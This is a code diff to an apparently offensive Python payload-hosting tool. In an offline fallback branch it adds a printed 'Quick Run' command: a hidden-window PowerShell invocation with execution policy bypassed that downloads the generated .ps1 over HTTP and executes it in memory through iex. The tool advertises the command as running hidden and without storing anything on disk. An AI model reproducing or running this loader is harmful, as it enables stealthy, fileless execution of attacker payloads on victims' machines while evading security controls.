@@ -67,6 +67,7 @@ class Generate:
             except Exception:
                 # Fallback to local loopback if the machine is entirely offline
                 print(f"[+]Available on :  http://127.0.0.1:{self.hosting_port}/{self.filename}.ps1")
+                print(f"[+] QUick RUn Code [Run Hidden/ Run from memmory without storing]\n----------------------------------------------------\n powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object net.WebClient).DownloadString('http://127.0.0.1:{self.hosting_port}/{self.filename}.ps1')\"")
             finally:
                 s.close()
         except Exception:
